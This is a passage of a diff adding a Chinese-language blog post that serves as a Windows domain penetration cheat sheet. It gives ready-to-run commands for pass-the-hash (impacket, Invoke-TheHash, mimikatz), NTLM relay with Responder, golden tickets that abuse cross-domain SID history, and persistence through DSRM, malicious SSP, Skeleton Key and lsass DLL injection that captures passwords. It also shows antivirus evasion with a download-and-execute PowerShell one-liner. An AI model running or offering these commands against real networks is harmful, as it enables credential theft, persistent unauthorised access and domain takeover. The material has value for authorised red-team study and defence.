+winrm e winrm/config/listener <span style="color:#75715e">#同上</span>
+
+配置auth
+winrm set winrm/config/service/auth @{Basic=<span style="color:#e6db74">&#34;true&#34;</span>}
+
+配置加密方式非加密
+winrm set winrm/config/service @{AllowUnencrypted=<span style="color:#e6db74">&#34;true&#34;</span>}
+
+可选-配置为基本身份呢验证
+winrm s winrm/config/Client/Auth @{Basic=<span style="color:#e6db74">&#34;true&#34;</span>}
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">winrm invoke Create wmicimv2/win32_process @{CommandLine=<span style="color:#e6db74">&#34;calc.exe&#34;</span>} -r<span style="color:#960050;background-color:#1e0010">:</span>http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.0.1<span style="color:#960050;background-color:#1e0010">:</span>5985 -u<span style="color:#960050;background-color:#1e0010">:</span>administrator -p<span style="color:#960050;background-color:#1e0010">:</span>123456
+winrs -r<span style="color:#960050;background-color:#1e0010">:</span>http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.0.1<span style="color:#960050;background-color:#1e0010">:</span>5985 -u<span style="color:#960050;background-color:#1e0010">:</span>Dev1 -p<span style="color:#960050;background-color:#1e0010">:</span>password <span style="color:#e6db74">&#34;whoami&#34;</span> winrs -r<span style="color:#960050;background-color:#1e0010">:</span>http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.0.1<span style="color:#960050;background-color:#1e0010">:</span>5985 -u<span style="color:#960050;background-color:#1e0010">:</span>makapaka.garden\Dev1 -p<span style="color:#960050;background-color:#1e0010">:</span>password <span style="color:#e6db74">&#34;whoami&#34;</span>
+</code></pre></div></li>
+</ol>
+<h2 id="0x22-票据传递">0x22 票据传递</h2>
+<ol>
+<li>
+<p>impacket套件</p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>226127b671f0b6ae0664ff0511a8c978 MAKAPAKA/Dev1@1.1.1.1 <span style="color:#e6db74">&#34;whoami&#34;</span>
+
+psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>226127b671f0b6ae0664ff0511a8c978 MAKAPAKA/Dev1@1.1.1.1 <span style="color:#e6db74">&#34;whoami&#34;</span>
+
+smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>226127b671f0b6ae0664ff0511a8c978 MAKAPAKA/Dev1@1.1.1.1 <span style="color:#e6db74">&#34;whoami&#34;</span>
+</code></pre></div></li>
+<li>
+<p>Invoke-TheHash套件</p>
+<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/">https://github.com/Kevin-Robertson/Invoke-TheHash/</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WMIExec -Target 10.10.0.1 -Domain makapaka.garden -Username username -Hash 226127b671f0b6ae0664ff0511a8c978 -Command <span style="color:#e6db74">&#34;calc.exe&#34;</span> -verbose
+
+Invoke-SMBExec -Target 10.10.0.1 -Domain makapaka.garden -Username username -Hash 226127b671f0b6ae0664ff0511a8c978 -Command <span style="color:#e6db74">&#34;calc.exe&#34;</span> -verbose
+</code></pre></div></li>
+<li>
+<p>mimikatz</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">privilege::debug sekurlsa::pth /user<span style="color:#960050;background-color:#1e0010">:</span>test1 /domain<span style="color:#960050;background-color:#1e0010">:</span>makapaka.garden /ntlm<span style="color:#960050;background-color:#1e0010">:</span>226127b671f0b6ae0664ff0511a8c978
+</code></pre></div><p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">privilege::debug 
+sekurlsa::ekeys
+privilege::debug
+sekurlsa::pth /user<span style="color:#960050;background-color:#1e0010">:</span>test1 /domain<span style="color:#960050;background-color:#1e0010">:</span>test.local /aes256<span style="color:#960050;background-color:#1e0010">:</span>aes256key
+</code></pre></div></li>
+<li>
+<p>NTLM-Relay(需在内网中具有ip)</p>
+<p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
+<ol>
+<li>
+<p>LLMNR</p>
+<p>网络代理自动发现协议</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">responder -I eth0
+</code></pre></div></li>
+<li>
+<p>WPAD</p>
+<p>网络自动发现协议，访问不存在的域名获得401认证</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">responder -I eth0 -wFb
+</code></pre></div></li>
+</ol>
+<p>实现ntlmrelay,域管机器访问不存在的机器时，会中继到域控机器，我们成功获取shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">responder -I eth0 ntlmrelayx.py -t dcserver -l ./
+</code></pre></div></li>
+</ol>
+<h2 id="0x23-域信任">0x23 域信任</h2>
+<p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权</p>
+<p>mimikatz命令</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#1 获取子域的 krbtgthash</span>
+lsadump::lsa /patch
+
+<span style="color:#75715e">#2 使用powerview获取父域sid</span>
+Get-DomainComputer -Domain makapaka.com
+
+<span style="color:#75715e">#3 然后添加一个sid=519的企业管理员</span>
+kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>Adminsitrator /krbtgt<span style="color:#960050;background-color:#1e0010">:</span>5a1c26831592774a17f70370b8606449 /domain<span style="color:#960050;background-color:#1e0010">:</span>child.makapaka.com /sid<span style="color:#960050;background-color:#1e0010">:</span>S-1-5-21-17子域9982-4053697927-1628754434 /sids<span style="color:#960050;background-color:#1e0010">:</span>S-1-5-21-4父域272-2299089681-4131927610-519 /ptt
+
+</code></pre></div><h2 id="0x24-kerberos票据">0x24 Kerberos票据</h2>
+<ol>
+<li>
+<p>票据→<a href="https://maka8ka.github.io/post/windows%E8%AE%A4%E8%AF%81/">https://maka8ka.github.io/post/windows认证</a></p>
+<ul>
+<li>kekeo</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">kekeo <span style="color:#e6db74">&#34;tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1&#34;</span>
+执行后生成票据 TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi
+kekeo <span style="color:#e6db74">&#34;kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&#34;</span> dir \server\c\$
+</code></pre></div></li>
+<li>
+<p>委派</p>
+<p><a href="https://maka8ka.github.io/post/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos%E5%A7%94%E6%B4%BE/">https://maka8ka.github.io/post/域渗透-kerberos委派/</a></p>
+</li>
+</ol>
+<h2 id="0x25-域权限维持">0x25 域权限维持</h2>
+<ol>
+<li>
+<p>DSRM</p>
+<p>DSRM，目录服务还原模式，是Windows服务器域控制器的安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。DSRM账户实际上就是“Administrator”，也就是域控上面的本地管理员账号，非域管理员账号。当建立域控时，会让我们设置DSRM密码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#域控制器</span>
+ntdsutil
+set DSRM password
+SYNC FROM DOMAIN ACCOUNT username <span style="color:#75715e">#username 为需要同步密码的域用户</span>
+Q
+Q
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">添加注册表
+reg add <span style="color:#960050;background-color:#1e0010">“</span> HKLM\System\CurrentControlSet\Control\Lsa<span style="color:#960050;background-color:#1e0010">”</span> /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">即可通过域控本地管理员登陆域控
+sekurlsa::pth /domain<span style="color:#960050;background-color:#1e0010">:</span>computername /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /ntlm<span style="color:#960050;background-color:#1e0010">:</span> b367819c0a8ccd792cad1d034f56a1fa
+</code></pre></div></li>
+<li>
+<p>GPO</p>
+<p>当我们获取到管理员权限时，可以通过添加组策略手段，实现用户开机自启动等操作</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">gpupdate /force
+强制刷新组策略
+</code></pre></div></li>
+<li>
+<p>SSP</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">将mimilib.dll复制到域控c<span style="color:#960050;background-color:#1e0010">:</span>\windows\system32
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\
+mimilib.dll
+</code></pre></div><p><img src="/images/WindowsInternalAttack/Untitled%201.png" alt="/images/WindowsInternalAttack/Untitled%201.png"></p>
+<p>重启后记录登录的密码。不重启,要利用<a href="https://maka8ka.github.io/post/rpc%E8%B0%83%E7%94%A8%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDssp/">RPC调用动态加载SSP</a>（后续补充学习）。</p>
+</li>
+<li>
+<p>Skeleton Key</p>
+<p>使用mimikatz安装万能密码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">privilege::debug
+misc::skeleton
+</code></pre></div><p>当执行完上述命令后，就可以使用“mimikatz”作为一个万能密码，去连接域控，该方法可用于当域控密码被改掉时，我们依然可以去控制域控。</p>
+</li>
+<li>
+<p>Hook PasswordChangeNotify</p>
+<p>通过往lsass.exe进程中注入dll，达到通过Hook</p>
+<p>PasswordChangeNotify拦截修改的帐户密码。该方法可用于拦截域内修改的密码。</p>
+<p><a href="https://github.com/Jumbo-WJB/Misc-Windows-Hacking">https://github.com/Jumbo-WJB/Misc-Windows-Hacking</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell <span style="color:#960050;background-color:#1e0010">–</span>exec bypass <span style="color:#960050;background-color:#1e0010">–</span>Command <span style="color:#e6db74">&#34;&amp; {Import-Module &#39;C:\Invoke-ReflectivePEInjection.ps1&#39;;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass}&#34;</span>
+</code></pre></div><p>密码保存在c:\windows\temp\passwords.txt</p>
+</li>
+</ol>
+<h2 id="0x26-免杀及其他">0x26 免杀及其他</h2>
+<ol>
+<li>
+<p>Powershell绕过</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">将powershell拷贝到指定目录<span style="color:#960050;background-color:#1e0010">，</span>修改文件名为xx.txt
+xx.txt -nop -w hidden -c <span style="color:#e6db74">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://0.0.0.0:80/a&#39;))&#34;</span>
+</code></pre></div></li>
+<li>
+<p>抓密码工具免杀</p>
+<p>1).配合上面的powershell绕过执行ps1版的mimikatz</p>
+<p>2).<a href="https://maka8ka.github.io/post/rpc%E8%B0%83%E7%94%A8%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDssp/">RPC调用动态加载SSP</a>让lsass.exe自己dump 内存</p>
+<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">https://blog.xpnsec.com/exploring-mimikatz-part-2/</a></p>
+<p>3).restorator工具增加版本信息</p>
+</li>
+<li>
+<p>源码免杀（后续补充）</p>
+</li>
+<li>
+<p>白名单免杀（后续补充）</p>
+<ol>
+<li>msbuild</li>
+<li>wmic</li>
+</ol>
+</li>
+</ol>
+
+  
+  </div>
+</article>
+
+
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Maka8ka 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/post/">Posts</a></li>
+         
+        <li><a href="/categories/">Categories</a></li>
+         
+        <li><a href="https://github.com/Maka8ka">Github</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+</html>
